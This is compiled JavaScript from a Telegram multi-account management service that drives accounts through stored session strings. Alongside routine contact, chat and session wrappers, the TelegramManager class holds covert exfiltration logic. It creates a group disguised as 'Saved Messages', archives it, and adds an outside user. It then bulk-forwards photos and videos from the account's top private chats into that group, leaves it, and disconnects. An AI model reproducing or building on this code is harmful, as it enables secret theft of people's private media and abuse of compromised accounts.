        return await telegramClient.exportContacts(format, includeBlocked);
    }
    async importContacts(mobile, contacts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Import contacts', { contactCount: contacts.length });
        return await telegramClient.importContacts(contacts);
    }
    async manageBlockList(mobile, userIds, block) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, block ? 'Block users' : 'Unblock users', { userIds });
        return await telegramClient.manageBlockList(userIds, block);
    }
    async getContactStatistics(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get contact statistics');
        return await telegramClient.getContactStatistics();
    }
    async createChatFolder(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Create chat folder', { name: options.name });
        return await telegramClient.createChatFolder(options);
    }
    async getChatFolders(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get chat folders');
        return await telegramClient.getChatFolders();
    }
    async getSessionInfo(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get session info');
        return await telegramClient.getSessionInfo();
    }
    async terminateSession(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Terminate session', options);
        return await telegramClient.terminateSession(options);
    }
    async editMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });
        return await telegramClient.editMessage(options);
    }
    async updateChatSettings(mobile, settings) {
        if (!settings.chatId) {
            throw new Error('chatId is required');
        }
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Update chat settings', { chatId: settings.chatId });
        return await telegramClient.updateChatSettings(settings);
    }
    async sendMediaBatch(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });
        return await telegramClient.sendMediaBatch(options);
    }
    async hasPassword(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Check password status');
        return await telegramClient.hasPassword();
    }
    async getContacts(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get contacts list');
        return await telegramClient.getContacts();
    }
    async getChats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get chats', options);
        return await telegramClient.getChats(options);
    }
    async getFileUrl(mobile, url, filename) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get file URL', { url, filename });
        return await telegramClient.getFileUrl(url, filename);
    }
    async getMessageStats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get message statistics', options);
        return await telegramClient.getMessageStats(options);
    }
    async sendViewOnceMedia(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });
        const { sourceType, chatId, caption, filename } = options;
        try {
            if (sourceType === 'path') {
                if (!options.path)
                    throw new common_1.BadRequestException('Path is required when sourceType is url');
                try {
                    const localPath = options.path;
                    if (!fs.existsSync(localPath)) {
                        throw new common_1.BadRequestException(`File not found at path: ${localPath}`);
                    }
                    let isVideo = false;
                    const ext = path.extname(localPath).toLowerCase().substring(1);
                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                    const fileBuffer = fs.readFileSync(localPath);
                    this.logger.info(mobile, 'Sending view once media from local file', {
                        path: localPath,
                        isVideo,
                        size: fileBuffer.length,
                        filename: filename || path.basename(localPath)
                    });
                    return await telegramClient.sendViewOnceMedia(chatId, fileBuffer, caption, isVideo, filename || path.basename(localPath));
                }
                catch (error) {
                    if (error instanceof common_1.BadRequestException) {
                        throw error;
                    }
                    this.logger.error(mobile, 'Failed to read local file', error);
                    throw new common_1.BadRequestException(`Failed to read local file: ${error.message}`);
                }
            }
            else if (sourceType === 'base64') {
                if (!options.base64Data)
                    throw new common_1.BadRequestException('Base64 data is required when sourceType is base64');
                const base64String = options.base64Data;
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                this.logger.info(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });
                const mediaData = Buffer.from(base64String, 'base64');
                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);
            }
            else if (sourceType === 'binary') {
                if (!options.binaryData)
                    throw new common_1.BadRequestException('Binary data is required when sourceType is binary');
                this.logger.info(mobile, 'Sending view once media from binary', {
                    size: options.binaryData.length,
                    filename: filename || 'unknown'
                });
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);
            }
            else {
                throw new common_1.BadRequestException('Invalid source type. Must be one of: url, base64, binary');
            }
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to send view once media', error);
            throw error;
        }
    }
    async getTopPrivateChats(mobile, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, `Get top private chats with limit=${limit || 10}`);
        try {
            return await telegramClient.getTopPrivateChats(limit);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting top private chats:', error);
            throw error;
        }
    }
    async addBotsToChannel(mobile, channelIds = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, "miscmessages", process.env.httpFailuresChannel]) {
        this.logger.info(mobile, 'Add bots to channel', { channelIds });
        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
        if (botTokens.length === 0) {
            console.warn('No bot tokens configured. Please set BOT_TOKENS environment variable');
            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
        }
        for (const token of botTokens) {
            try {
                const botInfo = await this.getBotInfo(token);
                if (botInfo) {
                    for (const channelId of channelIds) {
                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {
                            changeInfo: true,
                            postMessages: true,
                            editMessages: true,
                            deleteMessages: true,
                            banUsers: true,
                            inviteUsers: true,
                            pinMessages: true,
                            addAdmins: true,
                            anonymous: true,
                            manageCall: true
                        });
                    }
                    ;
                }
            }
            catch (error) {
                this.logger.error(mobile, 'Failed to setup bot in channel', error);
            }
        }
    }
    async getBotInfo(token) {
        try {
            const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${token}/getMe`);
            if (response.data?.ok) {
                return response.data.result;
            }
            throw new Error('Failed to get bot info');
        }
        catch (error) {
            throw new Error(`Failed to get bot info: ${error.message}`);
        }
    }
    async setupBotInChannel(mobile, channelId, botId, botUsername, permissions) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Setup bot in channel', { channelId, botId, botUsername });
        try {
            await telegramClient.joinChannel(channelId);
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to join channel', error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            this.logger.info(mobile, 'Bot added to channel', { channelId, botUsername });
            await (0, Helpers_1.sleep)(2000);
            this.logger.info(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);
        }
        catch (error) {
            this.logger.error(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            this.logger.debug(mobile, `Bot ${botUsername} promoted as admin in channel ${channelId}`);
        }
        catch (error) {
            this.logger.error(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);
        }
    }
    async createBot(mobile, createBotDto) {
        const client = await connection_manager_1.connectionManager.getClient(mobile);
        return client.createBot(createBotDto);
    }
    async connect(mobile, options) {
        await connection_manager_1.connectionManager.getClient(mobile, options);
    }
    async disconnect(mobile) {
        await connection_manager_1.connectionManager.unregisterClient(mobile);
    }
    async disconnectAll() {
        await connection_manager_1.connectionManager.disconnectAll();
    }
    getConnectionStats() {
        return connection_manager_1.connectionManager.getConnectionStats();
    }
    getClientState(mobile) {
        const state = connection_manager_1.connectionManager.getClientState(mobile);
        return state;
    }
    getActiveConnectionCount() {
        return connection_manager_1.connectionManager.getActiveConnectionCount();
    }
};
exports.TelegramService = TelegramService;
exports.TelegramService = TelegramService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __metadata("design:paramtypes", [users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        channels_service_1.ChannelsService])
], TelegramService);


/***/ }),

/***/ "./src/components/Telegram/TelegramManager.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/TelegramManager.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./src/IMap/IMap.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const generateTGConfig_1 = __webpack_require__(/*! ./utils/generateTGConfig */ "./src/components/Telegram/utils/generateTGConfig.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const withTimeout_1 = __webpack_require__(/*! ../../utils/withTimeout */ "./src/utils/withTimeout.ts");
const isPermanentError_1 = __importDefault(__webpack_require__(/*! ../../utils/isPermanentError */ "./src/utils/isPermanentError.ts"));
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.logger = new telegram_logger_1.TelegramLogger('TgManager');
        this.timeoutErr = null;
        this.MAX_FILE_SIZE = 100 * 1024 * 1024;
        this.FILE_DOWNLOAD_TIMEOUT = 60000;
        this.TEMP_FILE_CLEANUP_DELAY = 3600000;
        this.THUMBNAIL_CONCURRENCY_LIMIT = 3;
        this.THUMBNAIL_BATCH_DELAY_MS = 100;
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        this.logger.info(this.phoneNumber, "Creating group:", groupName);
        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        this.logger.info(this.phoneNumber, "Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"];
        this.logger.info(this.phoneNumber, "Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: new telegram_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        this.logger.info(this.phoneNumber, "Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }
    async archiveChat(id, accessHash) {
        const folderId = 1;
        this.logger.info(this.phoneNumber, "Archiving chat", id);
        return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new telegram_1.Api.InputFolderPeer({
                    peer: new telegram_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
    }
    async createOrJoinChannel(channel) {
        let channelId;
        let channelAccessHash;
        if (channel) {
            try {
                const result = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                this.logger.info(this.phoneNumber, "Archived chat", channelId);
            }
            catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
            }
        }
        else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash };
    }
    async forwardMedia(channel, fromChatId) {
        let channelId;
        try {
            this.logger.info(this.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                        this.logger.info(this.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                this.logger.info(this.phoneNumber, "Completed forwarding messages from top private chats to channel:", channelId);
            }
        }
        catch (e) {
            this.logger.info(this.phoneNumber, e);
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
        }
    }
    async forwardMediaToBot(fromChatId) {
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            this.logger.info(this.phoneNumber, messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        this.logger.info(this.phoneNumber, "Left the channel with ID:", toChatId);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async destroy() {
        this.clearTimeoutErr();
        if (this.client) {
            try {
                this.client._errorHandler = null;
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                await (0, Helpers_1.sleep)(2000);
                this.logger.info(this.phoneNumber, "Client Disconnected Sucessfully");
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            finally {
                if (this.client) {
                    this.client._destroyed = true;
                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                        await this.client._sender.disconnect();
                    }
                    this.client = null;
                }
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const me = await this.client.getMe();
            return me;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting user info:', error);
            throw error;
        }
    }
    clearTimeoutErr() {
        if (this.timeoutErr) {
            clearTimeout(this.timeoutErr);
            this.timeoutErr == null;
        }
    }
    async errorHandler(error) {
        const errorDetails = (0, parseError_1.parseError)(error, `${this.phoneNumber}: RPC Error`, false);
        if ((error.message && error.message == 'TIMEOUT') || (0, utils_1.contains)(errorDetails.message, ['ETIMEDOUT'])) {
            this.logger.error(this.phoneNumber, `Timeout error occurred for ${this.phoneNumber}`, error);
            this.timeoutErr = setTimeout(async () => {
                if (this.client && !this.client.connected) {
                    this.logger.debug(this.phoneNumber, "disconnecting client Connection Manually");
                    await (0, connection_manager_1.unregisterClient)(this.phoneNumber);
                }
                else if (this.client) {
                    this.logger.debug(this.phoneNumber, "Client Connected after Retry");
                }
                else {
                    this.logger.debug(this.phoneNumber, "Client does not exist");
                }
            }, 10000);
        }
        else {
        }
    }
    async createClient(handler = true, handlerFn) {
        const tgCreds = await (0, utils_1.getCredentialsForMobile)(this.phoneNumber);
        this.apiHash = tgCreds.apiHash;
        this.apiId = tgCreds.apiId;
        const tgConfiguration = await (0, generateTGConfig_1.generateTGConfig)(this.phoneNumber);
        await (0, withTimeout_1.withTimeout)(async () => {
            this.client = new telegram_1.TelegramClient(this.session, this.apiId, this.apiHash, tgConfiguration);
            this.client.setLogLevel(Logger_1.LogLevel.ERROR);
            this.client._errorHandler = this.errorHandler.bind(this);
            await this.client.connect();
            this.logger.info(this.phoneNumber, "Connected Client Succesfully");
            this.clearTimeoutErr();
        }, {
            timeout: 180000,
            errorMessage: `[Tg Manager]\n${this.phoneNumber}: Client Creation TimeOut\n`
        });
        if (handler && this.client) {
            if (handlerFn) {
                this.logger.info(this.phoneNumber, "Adding Custom Event Handler");
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.logger.info(this.phoneNumber, "Adding Default Event Handler");
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
                this.logger.info(this.phoneNumber, "Invalid group or channel!");
                return;
            }
            this.logger.info(this.phoneNumber, `Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new telegram_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                this.logger.info(this.phoneNumber, `Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            this.logger.info(this.phoneNumber, JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        this.logger.info(this.phoneNumber, JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                this.logger.info(this.phoneNumber, "No members found or invalid group.");
            }
            this.logger.info(this.phoneNumber, `${result.length}`);
            return result;
        }
        catch (err) {
            this.logger.error(this.phoneNumber, "Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const chats = [];
            let total = 0;
            for await (const dialog of this.client.iterDialogs(params)) {
                chats.push(dialog);
                total++;
            }
            this.logger.info(this.phoneNumber, "TotalChats:", total);
            return Object.assign(chats, { total });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting dialogs:', error);
            throw error;
        }
    }
    async getSelfMSgsInfo(limit = 500) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const self = await this.client.getMe();
            const selfChatId = self.id;
            let photoCount = 0;
            let ownPhotoCount = 0;
            let ownVideoCount = 0;
            let otherPhotoCount = 0;
            let otherVideoCount = 0;
            let videoCount = 0;
            let movieCount = 0;
            let analyzedMessages = 0;
            const maxLimit = Math.min(Math.max(limit, 1), 10000);
            for await (const message of this.client.iterMessages(selfChatId, {
                limit: maxLimit,
                reverse: false
            })) {
                analyzedMessages++;
                if (!message)
                    continue;
                const hasMedia = message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty);
                if (hasMedia) {
                    if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                        photoCount++;
                        if (message.out) {
                            ownPhotoCount++;
                        }
                        else {
                            otherPhotoCount++;
                        }
                    }
                    else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                        const document = message.media.document;
                        if (document instanceof telegram_1.Api.Document) {
                            const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                            if (isVideo) {
                                videoCount++;
                                if (message.out) {
                                    ownVideoCount++;
                                }
                                else {
                                    otherVideoCount++;
                                }
                            }
                        }
                    }
                }
                if (message.text) {
                    const text = message.text.toLowerCase();
                    const movieKeywords = ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'];
                    if ((0, utils_1.contains)(text, movieKeywords)) {
                        movieCount++;
                    }
                }
                if (analyzedMessages >= maxLimit) {
                    break;
                }
            }
            let totalMessages = analyzedMessages;
            try {
                const firstBatch = await this.client.getMessages(selfChatId, { limit: 1 });
                if (firstBatch.total) {
                    totalMessages = firstBatch.total;
                }
            }
            catch (totalError) {
                this.logger.debug(this.phoneNumber, 'Could not fetch total message count, using analyzed count');
            }
            this.logger.info(this.phoneNumber, `getSelfMSgsInfo: Analyzed ${analyzedMessages} messages`, {
                photoCount,
                videoCount,
                movieCount,
                total: totalMessages
            });
            return {
                total: totalMessages,
                photoCount,
                videoCount,
                movieCount,
                ownPhotoCount,
                otherPhotoCount,
                ownVideoCount,
                otherVideoCount,
                analyzedMessages
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getSelfMSgsInfo:', error);
            throw error;
        }
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new telegram_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    this.logger.info(this.phoneNumber, e);
                }
            }
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new telegram_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            this.logger.info(this.phoneNumber, "Imported Contacts Result:", result);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        this.logger.info(this.phoneNumber, "Leaving Channels/Groups: initiated!!");
        this.logger.info(this.phoneNumber, "ChatsLength: ", chats.length);
        if (chats.length === 0) {
            this.logger.info(this.phoneNumber, "No chats to leave");
            return;
        }
        const chatsToLeave = new Set();
        for (const id of chats) {
            chatsToLeave.add(id);
            if (id.startsWith('-100')) {
                chatsToLeave.add(id.substring(4));
            }
            else {
                chatsToLeave.add(`-100${id}`);
            }
        }
        const entityMap = new Map();
        let foundCount = 0;
        try {
            for await (const dialog of this.client.iterDialogs({})) {
                const entity = dialog.entity;
                if (entity instanceof telegram_1.Api.Channel || entity instanceof telegram_1.Api.Chat) {
                    const entityId = entity.id.toString();
                    if (chatsToLeave.has(entityId)) {
                        entityMap.set(entityId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length) {
                            this.logger.debug(this.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);
                            break;
                        }
                    }
                    if (entityId.startsWith('-100')) {
                        const shortId = entityId.substring(4);
                        if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {
                            entityMap.set(shortId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length)
                                break;
                        }
                    }
                    else {
                        const longId = `-100${entityId}`;
                        if (chatsToLeave.has(longId) && !entityMap.has(longId)) {
                            entityMap.set(longId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length)
                                break;
                        }
                    }
                }
            }
            this.logger.debug(this.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Failed to iterate dialogs:", error);
            throw error;
        }
        if (entityMap.size === 0) {
            this.logger.warn(this.phoneNumber, "No matching chats found in dialogs to leave");
            return;
        }
        const me = await this.client.getMe();
        let successCount = 0;
        let skipCount = 0;
        for (const id of chats) {
            try {
                let entityData = entityMap.get(id) ||
                    entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);
                if (!entityData) {
                    this.logger.warn(this.phoneNumber, `Chat ${id} not found in dialogs, skipping`);
                    skipCount++;
                    continue;
                }
                const { entity } = entityData;
                let chatType;
                let left = false;
                if (entity instanceof telegram_1.Api.Channel) {
                    await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                        channel: entity
                    }));
                    chatType = entity.broadcast ? 'channel' : 'supergroup';
                    left = true;
                }
                else if (entity instanceof telegram_1.Api.Chat) {
                    await this.client.invoke(new telegram_1.Api.messages.DeleteChatUser({
